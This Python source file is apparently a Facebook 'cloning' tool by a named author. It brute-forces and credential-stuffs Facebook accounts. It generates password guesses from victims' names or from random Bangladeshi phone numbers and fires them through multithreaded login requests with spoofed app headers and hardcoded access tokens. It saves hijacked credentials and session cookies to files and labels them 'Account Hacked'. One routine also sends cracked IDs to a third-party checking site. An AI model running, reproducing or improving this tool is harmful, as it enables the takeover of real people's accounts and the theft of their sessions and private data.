#-*-coding:utf-8-*-
#!/usr/bin/python3
#!/coding by Mahadi Hasan Afridi
import os,bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool 
import requests
try:
    import concurrent.futures
except ImportError:
    print('\n \033[1;91m[\033[1;93mMAHADI-143\033[1;91m]\033[1;97m installing futures !...\n')
    time.sleep(0.5)
    os.system('pip install futures')

try: 
    import bs4
except ImportError:
    print('\n \033[1;91m[\033[1;93mMAHADI-143\033[1;91m]\033[1;97m installing bs4 !...\n')
    time.sleep(0.5)
    os.system('pip install bs4')

orange = "\x1b[38;5;196m"
yellow = "\x1b[38;5;208m"
black="\033[1;30m"
rad="\x1b[38;5;160m"
green="\x1b[38;5;46m"
yelloww="\033[1;33m"
blue="\033[38;5;6m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[1;37m"
faltu = "\033[1;47m"
pvt = "\033[1;0m"
gren = "\x1b[38;5;154m"
gas = "\033[1;32m"
my_color = [white,blue,green];warna = random.choice(my_color)
loop = 0
oks = []
cps = []
id = []
ck = []
sasi = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
tete = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
now = datetime.now()
hari = now.day
blx = now.month
try:
    if blx < 0 or blx > 12:exit()
    xx = blx - 1
except ValueError:exit()
bulan = sasi[xx]
tahun = now.year
today = '\x1b[38;5;46m'+str(hari)+'\033[1;97m-\x1b[38;5;46m'+str(bulan)+''
def tahun(fx):
    if len(fx)==15:
        if fx[:10] in ['1000000000']       :tahunz = '2009'
        elif fx[:9] in ['100000000']       :tahunz = '2009'
        elif fx[:8] in ['10000000']        :tahunz = '2009'
        elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
        elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
        elif fx[:6] in ['100001']          :tahunz = '2010'
        elif fx[:6] in ['100002','100003'] :tahunz = '2011'
        elif fx[:6] in ['100004']          :tahunz = '2012'
        elif fx[:6] in ['100005','100006'] :tahunz = '2013'
        elif fx[:6] in ['100007','100008'] :tahunz = '2014'
        elif fx[:6] in ['100009']          :tahunz = '2015'
        elif fx[:5] in ['10001']           :tahunz = '2016'
        elif fx[:5] in ['10002']           :tahunz = '2017'
        elif fx[:5] in ['10003']           :tahunz = '2018'
        elif fx[:5] in ['10004']           :tahunz = '2019'
        elif fx[:5] in ['10005']           :tahunz = '2020'
        elif fx[:5] in ['10006']           :tahunz = '2021'
        elif fx[:5] in ['10009']           :tahunz = '2023'
        elif fx[:5] in ['10007','10008']:tahunz = '2022'
        else:tahunz=''
    elif len(fx) in [9,10]:
        tahunz = '2008'
    elif len(fx)==8:
        tahunz = '2007'
    elif len(fx)==7:
        tahunz = '2006'
    else:tahunz=''
    return tahunz
#━━━━[ BANNER/LOGO ]━━━━#
def ____banner____():
    if "win" in sys.platform:os.system("cls")
    else:os.system("clear")
    print(f"""  \x1b[38;5;43m▙▗▌▞▀▖▌ ▌▞▀▖▛▀▖▜▘ ▌ ▌▞▀▖▞▀▖▞▀▖▙ ▌
  \x1b[38;5;42m▌▘▌▙▄▌▙▄▌▙▄▌▌ ▌▐  ▙▄▌▙▄▌▚▄ ▙▄▌▌▌▌
  \x1b[38;5;41m▌ ▌▌ ▌▌ ▌▌ ▌▌ ▌▐  ▌ ▌▌ ▌▖ ▌▌ ▌▌▝▌
  \x1b[38;5;40m▘ ▘▘ ▘▘ ▘▘ ▘▀▀ ▀▘ ▘ ▘▘ ▘▝▀ ▘ ▘▘ ▘{green}V{white}/{green}0.1
{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {rad}[{white}⁂{rad}] {green}DEVELOPER  {white}- {green}MAHADI HASAN AFRIDI
 {rad}[{white}⁂{rad}] {green}FACEBOOK   {white}- {green}MAHADI HASAN AFRIDI
 {rad}[{white}⁂{rad}] {green}TOOLTYPE   {white}- {green}FREE{white}{rad}┼{faltu}{rad}FILE & RANDOM{pvt}{green}{rad}┼
 {rad}[{white}⁂{rad}] {green}GITHUB     {white}- github.com/MAHADI-143
{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

#━━━━[ LINE ]━━━━#
def linex():
        print(f"{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

#━━━━[ MAIN ]━━━━#
def ____Main___():
    ____banner____()
    print(f' {rad}[{white}A{rad}] {green}START RANDOM CLONING')
    print(f' {rad}[{white}B{rad}] {green}START FILE CLONING')
    print(f' {rad}[{white}C{rad}] {green}START FILE MAKING')
    print(f' {rad}[{white}D{rad}] {green}EXIT PROGRAMMING');linex()
    __Mahadi__ = input(f' {rad}[{white}⁂{rad}] {green}SELECTION {white} - {yelloww}')
    if __Mahadi__ in ['A','a','01','1']:bd_rnd()
    elif __Mahadi__ in ['B','b','02','2']:__FILEX__()
    elif __Mahadi__ in ['C','c','03','3']:__FILEX__()
    elif __Mahadi__ in ['D','d','04','4']:__FILEX__()
    else:print(f'\n [×]{rad} Choose Value Option... ');____Main___()


def __FILEX__():
    global oks,cps
    ____banner____()
    dfile = input(f' {rad}[{white}⁂{rad}] {green}EXAMPLE {rad}[{white}sdcard/mahadi.txt{rad}]\n {rad}[{white}⁂{rad}] {green}INPUT FILE PATH {white}- {yelloww}');linex()
    print(f' {rad}[{white}A{rad}] {green}METHOD M1 (BD-INDIA)')
    print(f' {rad}[{white}B{rad}] {green}METHOD M2 (INDIA/BD)')
    print(f' {rad}[{white}C{rad}] {green}METHOD M3 (BD-INDIA)');linex()
    __METHOD__ = input(f" {rad}[{white}⁂{rad}] {green}SELECTION {white}- {yelloww}");linex()
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{rad}[×] FILE NOT FOUND...');time.sleep(1);__FILEX__()
    dplist = []
    try:
        pass_lmit = int(input(f' {rad}[{white}⁂{rad}] {green}INPUT PASS LIMITS {white}- {yelloww}'));linex()
    except:
        pass_lmit = 5
    for i in range(pass_lmit):
        dplist.append(input(f' {rad}[{white}⁂{rad}] {green}EXAMPLE {rad}[{white}firstlast first123 ETC{rad}]\n {rad}[{white}⁂{rad}] {green}PASSWORD NO.{i+1} {white}- {yelloww}'));linex()
    with ThreadPool(max_workers=25) as Mahadi:
        ____banner____();total_ids = str(len(dx))
        print(f' {rad}[{white}⁂{rad}] {green}TOTAL IDS  {white}- \x1b[38;5;38m{total_ids}{rad}┼{green}METHOD {white}- {__METHOD__}')
        print(f' {rad}[{white}⁂{rad}] {green}IF NO RESULT [{white}On/Off{green}] AIRPLANE MODE')
        linex()
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            if __METHOD__ in ["A","a"]:
                Mahadi.submit(__MTDONE__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["B","b"]:
                Mahadi.submit(__MTDTWO__,ids,names,passlist,total_ids)
            elif __METHOD__ in ["C","c"]:
                Mahadi.submit(__MTDTHREE__,ids,names,passlist,total_ids)
            else:
                Mahadi.submit(__MTDONE__,ids,names,passlist,total_ids)
    print('');linex()
    print(f" {rad}[{white}⁂{rad}] {green}THE PROCESS HAS COMPLETE")
    print(f" {rad}[{white}⁂{rad}] {green}TOTAL OKS  {white}- {green}{len(oks)}")
    linex();exit()


def __MTDONE__(ids,names,passlist,total_ids):
    global oks,cps,loop
    sys.stdout.write(f"\r\r{rad} [{green}{today}{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "cpl": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": str(uuid.uuid4()),
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {
            ###USERAGENT NICHE       
                'user-agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/216.0.0.38.104;FBBV/149356190;FBDM/{density=3.0,width=720,height=1440};FBLC/en_US;FBCR/Axis;FBMF/Coolpad;FBBD/Coolpad;FBPN/com.facebook.katana;FBDV/cp3648AT;FBSV/9.0;nullFBCA/armeabi-v7a:armeabi;]',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'gra'+'ph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            url = "https://api.face"+"book.com/au"+"th/lo"+"gin"
            po = requests.post(url,data=data,headers=head).text
            q = json.loads(po)
            if 'session_key' in q:
                cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f"\r\r{rad} ├─ {green}A{rad}c{yellow}c{cyan}o{purple}u{yelloww}n{blue}t {rad}H{cyan}a{yellow}c{purple}k{green}e{yelloww}d {green}B{blue}y {green}MAHADI{white} - {green}143")
                print(f"\r\r{rad} ├─ {green}{ids}{white} -{green} {pas}")
                print(f"\r\r{rad} └─ {green}{cookie}\n")
                oks.append(ids)
                open('/sdcard/MAHADI-M1-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MAHADI-M1-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                break
            elif 'mbasic.facebook.com' in q['error']['message']:
           #     print(f"\r{rad} [MAHADI-CP] {ids} - {pas}")
                cps.append(ids)
                open('/sdcard/MAHADI-CP.txt','a').write(ids+'|'+pas+'\n')
                break 
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
        


def __MTDTWO__(ids,names,passlist,total_ids):
    global oks,cps,loop
    sys.stdout.write(f"\r{rad} [{green}{today}{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            data = {
           "adid": str(uuid.uuid4()),
           "method": "POST",
           "format": "json",
           "device_id": str(uuid.uuid4()),
           "family_device_id": str(uuid.uuid4()),
           "email": ids,
           "password": pas,
           "cpl": "true",
           "credentials_type": "password",
           "generate_session_cookies": "1",
           "error_detail_type": "button_with_disabled",
           "generate_machine_id": "1",
           "locale": "en_US",
           "client_country_code": "US",
           "omit_response_on_success": "false",
           "advertising_id": str(uuid.uuid4()),
           "fb_api_req_friendly_name": "authenticate"}
            head = {
           'host': 'graph.facebook.com',
           'Authorization': 'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
           'x-fb-connection-bandwidth': str(random.randint(20000000, 40000000)),
           'x-fb-net-hni': str(random.randint(20000, 40000)),
           'x-fb-sim-hni': str(random.randint(20000, 40000)),
           'x-fb-connection-quality': 'GOOD',
           'x-fb-connection-type': 'MOBILE.LTE',
           ###USERAGENT NICHE
           'user-agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/216.0.0.38.104;FBBV/149356190;FBDM/{density=3.0,width=720,height=1440};FBLC/en_US;FBCR/Axis;FBMF/Coolpad;FBBD/Coolpad;FBPN/com.facebook.katana;FBDV/cp3648AT;FBSV/9.0;nullFBCA/armeabi-v7a:armeabi;]',
           'content-type': 'app_authlication/x-www-form-urlencoded',
           'x-fb-http-engine': 'Liger',
           'x-fb-client-IP': 'True',
           'x-fb-server-cluster': 'Keep-Alive',
           'Content-Type': 'application/json'}
            url = "https://api.face"+"book.com/au"+"th/lo"+"gin"
            po = requests.post(url,data=data,headers=head).text
            q = json.loads(po)
            if 'session_key' in q:
                cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                print(f"\r\r{rad} ├─ {green}A{rad}c{yellow}c{cyan}o{purple}u{yelloww}n{blue}t {rad}H{cyan}a{yellow}c{purple}k{green}e{yelloww}d {green}B{blue}y {green}MAHADI{white} - {green}143")
                print(f"\r\r{rad} ├─ {green}{ids}{white} -{green} {pas}")
                print(f"\r\r{rad} └─ {green}{cookie}\n")
                oks.append(ids)
                open('/sdcard/MAHADI-M2-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MAHADI-M2-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                break
            elif 'mbasic.facebook.com' in q['error']['message']:
               # print(f"\r{rad} [MAHADI-CP] {ids} - {pas}")
                cps.append(ids)
                open('/sdcard/MAHADI-CP.txt','a').write(ids+'|'+pas+'\n')
                break 
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass


def __MTDTHREE__(ids,names,passlist,total_ids):
    global oks,cps,loop
    sys.stdout.write(f"\r{rad} [{green}{today}{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)    
###USERAGENT NICHE       
            head = {'user-agent': '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/216.0.0.38.104;FBBV/149356190;FBDM/{density=3.0,width=720,height=1440};FBLC/en_US;FBCR/Axis;FBMF/Coolpad;FBBD/Coolpad;FBPN/com.facebook.katana;FBDV/cp3648AT;FBSV/9.0;nullFBCA/armeabi-v7a:armeabi;]',
            'host': 'b-graph.facebook.com','x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'WIFI','x-tigon-is-retry': 'False','x-fb-http-engine': 'Liger','x-fb-client-ip': 'True','x-fb-server-cluster': 'True','x-fb-device-group': str(random.randint(2000,4000)),'x-fb-net-hni': str(random.randint(20000, 40000)),'x-fb-sim-hni': str(random.randint(20000, 40000)),'x-fb-request-analytics-tags':  'graphservice','Authorization': 'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895','content-type': 'application/x-www-form-urlencoded','x-fb-friendly-name': 'authenticate',}
            data = {'adid': str(uuid.uuid4()).upper(),
            'device_id': str(uuid.uuid4()).upper(),
            'family_device_id': str(uuid.uuid4()).upper(),
            'secure_family_device_id': str(uuid.uuid4()).upper(),
            'access_token': '256002347743983|374e60f8b9bb6b8cbb30f78030438895','api_key': '256002347743983','community_id': '','cpl': 'true','credentials_type': 'password','currently_logged_in_userid': '0','email': ids,'password': pas,'enroll_misauth': 'false','fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler','fb_api_req_friendly_name': 'authenticate','format': 'json','generate_analytics_claim': '1','generate_machine_id': '1','generate_session_cookies': '1','jazoest': '22621','client_country_code': 'US','locale': random.choice(['en_US','en_GB','bn_IN','en_IN']),'sdk_version': str(random.randint(1,26)),'sdk': 'android','meta_inf_fbmeta': 'NO_FILE','sig': 'd29d67d37eca387482a8a5b740f84f62','source': 'login','try_num': '1',}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head).text
            q = json.loads(po)
            if 'session_key' in q:
                cookie = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);tree=Tree('')
                print(f"\r\r{rad} ├─ {green}A{rad}c{yellow}c{cyan}o{purple}u{yelloww}n{blue}t {rad}H{cyan}a{yellow}c{purple}k{green}e{yelloww}d {green}B{blue}y {green}MAHADI{white} - {green}143")
                print(f"\r\r{rad} ├─ {green}{ids}{white} -{green} {pas}")
                print(f"\r\r{rad} └─ {green}{cookie}\n")
                oks.append(ids)
                open('/sdcard/MAHADI-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MAHADI-M3-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                break
            elif 'mbasic.facebook.com' in q['error']['message']:
         #       print(f"\r{rad} [MAHADI-CP] {ids} - {pas}")
                cps.append(ids)
                open('/sdcard/MAHADI-CP.txt','a').write(ids+'|'+pas+'\n')
                break 
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
        
def bd_rnd():
    id = []
    ____banner____()
    print(f" {rad}[{white}⁂{rad}] {green}SIM CODE   {white}- {green}01711 01872 01993 01628")
    code = input(f" {rad}[{white}⁂{rad}] {green}INPUT CODE {white}-{green} ")
    print(f" {rad}[{white}⁂{rad}] {green}EXAMPLE    {white}- {green}1433 999 9999 99999")
    limit = int(input(f" {rad}[{white}⁂{rad}] {green}LIMITS  {white}   - {green}"))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        id.append(nmp)
    with ThreadPool(max_workers=50) as NadiyaMahadii:
        ____banner____()
        tl = str(len(id))
        print(f" {rad}[{white}⁂{rad}] {green}SIM CODE   {white}-  {green}{code}") 
        print(f" {rad}[{white}⁂{rad}] {green}TOTAL ID   {white}-  {green}{tl}")        
        print(f" {rad}[{white}⁂{rad}] {green}IF NO RESULT ON {white}- {green}OFF AIRPLANE MODE")
        linex()
        for love in id:
            ids = code + love
            #passlist = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:], '১২৩৪৫৬৭৮৯']
            passlist = [love,ids[:6],ids[:7],love[:7],ids]
            NadiyaMahadii.submit(rnd_m1, ids, passlist)
    print('');linex()
    print(f" {rad}[{white}⁂{rad}] {green}THE PROCESS HAS COMPLETE")
    print(f" {rad}[{white}⁂{rad}] {green}TOTAL OKS  {white}- {green}{len(oks)}")
    linex();exit()

ugen=[]
for ua in range(99999):
    rr=random.randint;rc=random.choice
    mod = [
    "SM-G991",
    "SM-A326",
    "SM-N986",
    "SM-F711",
    "SM-M325",
    "SM-A125",
    "SM-G998",
    "SM-A515",
    "SM-G781",
    "SM-A526",
    "SM-G611",
    "SM-J722",
    "SM-E425",
    "SM-C312",
    "SM-H813",
    "SM-Q502",
    "SM-T331",
    "SM-R141",
    "SM-X212",
    "SM-V811",
    "SM-Z123",
    "SM-L624",
    "SM-K934",
    "SM-U245",
    "SM-I567",
    "SM-P999",
    "SM-Y443",
    "SM-D888",
    "SM-W345",
    "SM-B123"
]
    a=f"Mozilla/5.0 (Linux; Android {str(rr(6,14))}; {str(rc(mod))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(110,122))}.0.{str(rr(3333,7777))}.{str(rr(70,250))} Mobile Safari/537.36"
    ugen.append(a)

def rndi_m1(ids,passlist):
    try:
        global oks,cps,loop
        sys.stdout.write(f'\r\r {rad}[{yellow}{ids}{rad}]{white}-{rad}[{yelloww}{loop}{rad}]{white}-{rad}[{green}OK{white}:{green}{len(oks)}{rad}]');sys.stdout.flush()
        for pas in passlist:
            ua = random.choice(ugen)
            session=requests.Session()
            link = session.get('https://mbasic.facebook.com/').text
            data = {
            'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1),
            'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1),
            'li': re.search('name="li" value="(.*?)"',str(link)).group(1),
            'email': ids,
            'pass': pas,
            '__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),
            'next': 'https://mbasic.facebook.com/dialog/oauth?redirect_uri=https%3A%2F%2Ffreelogocreator.com%2Fauthenticated%2Ffacebook&scope=email&response_type=code&state=427891a7-a16d-42b6-9dcc-a3cb091e5f5b&client_id=1391389975118952&ret=login&fbapp_pres=0&logger_id=79c71734-2858-43b8-9d4f-414b819cc74d&tp=unspecified',
            'flow': 'login_no_pin'
            }
            head = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-US,en;q=0.9', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'dpr': '1', 'origin': 'https://mbasic.facebook.com', 'referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1391389975118952&kid_directed_site=0&app_id=1391389975118952&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fdialog%2Foauth%3Fredirect_uri%3Dhttps%253A%252F%252Ffreelogocreator.com%252Fauthenticated%252Ffacebook%26scope%3Demail%26response_type%3Dcode%26state%3D10674b03-f38a-409d-ab05-64401bb58e75%26client_id%3D1391389975118952%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dcd691229-3358-4264-8278-5522cfd03c89%26tp%3Dunspecified&cancel_url=https%3A%2F%2Ffreelogocreator.com%2Fauthenticated%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D10674b03-f38a-409d-ab05-64401bb58e75%23_%3D_&display=page&locale=en_GB&pl_dbl=0', 'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua': '"Microsoft Edge";v="123", "Not:A-Brand";v="8", "Chromium";v="123"', 'sec-ch-ua-full-version-list': '"Microsoft Edge";v="123.0.2420.65", "Not:A-Brand";v="8.0.0.0", "Chromium";v="123.0.6312.87"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-ua-platform-version': '"10.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'viewport-width': '811'}
            url = 'https://mbasic.facebook.com/login/device-based/regular/login'+'/?login_attempt='+'1&next=https%3A%2F%2F'+'mbasic.facebook.com%2Fdialog%2Foauth%3Fredirect_uri%3Dhttps%253A%252F%252Ffreelogocreator.com%252Fauthenticated%252Ffacebook%26scope%3Demail%26response_type%3Dcode%26state%3D10674b03-f38a-409d-ab05-64401bb58e75%26client_id%3D1391389975118952%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dcd691229-3358-4264-8278-5522cfd03c89%26tp%3Dunspecified%26cbt%3D1711991099260&lwv=100'
            session.post(url,data=data,headers=head).text
            q = session.cookies.get_dict().keys()
            if 'c_user' in q:
                cookie=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                ids = re.findall('c_user=(.*);xs', cookie)[0]
                ckk = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={ids}"
                res = requests.get(ckk).text
                if 'live' in res:
                    print(f"\r\r{rad} ├─ {green}A{rad}c{yellow}c{cyan}o{purple}u{yelloww}n{blue}t {rad}H{cyan}a{yellow}c{purple}k{green}e{yelloww}d {green}B{blue}y {green}MAHADI{white} - {green}143")
                    print(f"\r\r{rad} ├─ {green}{ids}{white} -{green} {pas}")
                    print(f"\r\r{rad} └─ {green}{cookie}\n")
                    oks.append(ids)
                    open('/sdcard/MAHADI-RN-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MAHADI-RN-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                    break
            else:
                continue
        loop+=1      
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
 
def rnd_m1(ids,passlist):
    global oks,cps,loop
    sys.stdout.write(f'\r\r {rad}[{yellow}{ids}{rad}]{white}-{rad}[{yelloww}{loop}{rad}]{white}-{rad}[{green}OK{white}:{green}{len(oks)}{rad}]');sys.stdout.flush()
    try:
        for pas in passlist:
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            ua  = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/379.0.0.24.109;FBBV/389395417;FBDM/{density=2.75,width=1080,height=2168};FBLC/lv_LV;FBRV/0;FBCR/BITE_LV;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            device_id = str(uuid.uuid4())
            data = {
            'adid':adid,
            'format':'json',
            'device_id':device_id,
            'email':ids,
            'password':pas,
            'advertiser_id':str(uuid.uuid4()),
            'generate_analytics_claims':'1',
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'fb_api_req_friendly_name':'authenticate',
            'logged_out_id': 'd216595c-a66c-403a-81aa-7548d46b1e62',
            'hash_id': 'cd0e9136-779a-452a-9e91-e677d38b6047',
            'reg_instance': '19df2a5d-9085-4080-b877-f00b792e14ba',
            'session_id': '4b30cdd3-0445-4eb3-a701-4e0e45bdbbf0',
            }
            headers={
            'Authorization':f'OAuth {accessToken}',
            'Host': 'graph.facebook.com',
            'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
            'x-fb-Client-IP': 'True',
            'x-fb-Server-Cluster': 'True',
            'x-fb-Request-Analytics-Tags': 'graphservice',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Connection-Bandwidth':str(random.randint(2e7,3e7)),
            'X-FB-Net-HNI': str(random.randint(20000,40000)),
            'X-FB-SIM-HNI': str(random.randint(20000,40000)),
            'X-FB-Connection-Type':'MOBILE.LTE',
            'User-Agent':ua,
            'Accept-Encoding':'gzip, deflate',
            'Connection': 'Keep-Alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://graph.facebook.com/auth/login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            po = requests.post(url,data=data,headers=headers).json()
            if 'session_key' in po:
                try:
                    uid = po['uid']
                except:
                    uid = ids
                if str(uid) in oks:
                    break
                else:
                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    print(f"\r\r{rad} ├─ {green}A{rad}c{yellow}c{cyan}o{purple}u{yelloww}n{blue}t {rad}H{cyan}a{yellow}c{purple}k{green}e{yelloww}d {green}B{blue}y {green}MAHADI{white} - {green}143")
                    print(f"\r\r{rad} ├─ {green}{ids}{white} -{green} {pas}")
                    print(f"\r\r{rad} └─ {green}{coki}\n")
                    oks.append(uid)
                    open('/sdcard/MAHADI-RN-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MAHADI-RN-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                    break
            elif 'www.facebook.com' in po['error']['message']:
                try:
                    uid = po['error']['error_data']['uid']
                except:
                    uid = ids
                if uid in oks:pass
                else:
                    #print('\r\r\x1b[38;5;214m [-CP] '+str(uid)+' | '+pas+'                ')
                    open('/sdcard/-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                    cps.append(ids)
                    break
            else:continue
        loop+=1
    except Exception as e:
        pass
        
